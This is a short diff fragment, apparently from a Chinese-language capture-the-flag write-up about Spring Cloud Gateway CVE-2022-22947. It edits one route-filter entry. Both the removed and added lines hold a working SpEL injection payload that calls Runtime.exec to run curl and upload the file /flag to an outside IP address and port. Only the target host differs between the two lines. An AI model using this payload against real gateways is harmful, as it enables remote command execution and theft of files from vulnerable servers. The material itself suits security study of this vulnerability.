@@ -24,7 +24,7 @@ Spring Cloud Gateway曾出现CVE-2022-22947漏洞，该漏洞允许攻击者通�
                                 "name": "AddResponseHeader",
                                 "args": {
                                     "name": "result",
-                                    "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'curl','http://47.113.202.32:23233','-T','/flag'}).getInputStream())).replaceAll('\n','').replaceAll('\r','')}"
+                                    "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'curl','http://1.92.88.247:2333','-T','/flag'}).getInputStream())).replaceAll('\n','').replaceAll('\r','')}"
                                 }
                             }
                         ]
